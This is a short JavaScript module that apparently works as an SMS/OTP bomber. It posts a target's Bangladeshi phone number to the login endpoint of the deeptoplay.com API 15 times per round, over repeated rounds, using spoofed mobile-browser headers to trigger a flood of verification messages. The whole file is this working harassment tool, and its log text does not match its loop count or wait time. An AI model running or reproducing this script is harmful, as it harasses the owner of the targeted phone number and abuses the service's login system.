const axios = require("axios");

async function deepto(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 15; i++) {
      try {
        const response = await axios.post(
  'https://api.deeptoplay.com/v2/auth/login',
  {
    'number': `+88${number}`
  },
  {
    params: {
      'country': 'BD',
      'platform': 'web',
      'language': 'en'
    },
    headers: {
      'authority': 'api.deeptoplay.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'authorization': '',
      'content-type': 'application/json',
      'origin': 'https://www.deeptoplay.com',
      'referer': 'https://www.deeptoplay.com/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 300000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { deepto };
